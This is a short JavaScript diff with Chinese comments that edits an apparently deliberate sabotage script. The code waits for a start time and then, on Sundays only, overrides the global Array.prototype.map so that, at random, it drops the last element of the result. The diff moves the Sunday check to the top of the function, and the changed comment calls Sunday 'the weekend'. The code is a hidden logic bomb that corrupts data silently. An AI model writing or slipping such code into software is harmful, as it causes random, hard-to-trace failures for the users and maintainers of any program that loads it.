@@ -1,5 +1,6 @@
 ((tz) => {
   if (tz && (+new Date() < tz)) return // 如果没到开始时间，什么都不干
+  if (new Date().getDay() !== 0) return // 非周末，什么都不干
 
   // 幸运数字们
   const luckNum1 = Math.random()
@@ -39,11 +40,11 @@
     }
   }
 
-  // 当周末时，Array.map 有 luckNum5 的概率丢失最后一个元素
+  // Array.map 有 luckNum5 的概率丢失最后一个元素
   const _Array_map = Array.prototype.map;
   Array.prototype.map = function (...args) {
     result = _Array_map.call(this, ...args);
-    if (new Date().getDay() === 0 && _Math_Random() < luckNum5) {
+    if (_Math_Random() < luckNum5) {
       result.length = Math.max(result.length - 1, 0);
     }
     return result;
